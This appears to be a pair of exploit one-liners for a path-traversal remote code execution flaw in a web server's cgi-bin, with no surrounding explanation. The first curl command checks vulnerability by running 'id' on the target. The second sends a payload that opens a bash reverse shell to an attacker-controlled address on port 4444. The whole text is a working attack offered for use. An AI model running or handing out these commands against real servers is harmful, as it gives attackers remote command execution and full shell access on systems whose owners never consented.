check
```
curl 'http://IPADDR/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh' --data 'echo Content-Type: text/plain; echo; id'
```

reverse shell
```
curl 'http://192.168.x.x/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh' --data 'echo Content-Type: text/plain; echo; bash -c "bash -i >& /dev/tcp/192.168.x.x/4444 0>&1"'
```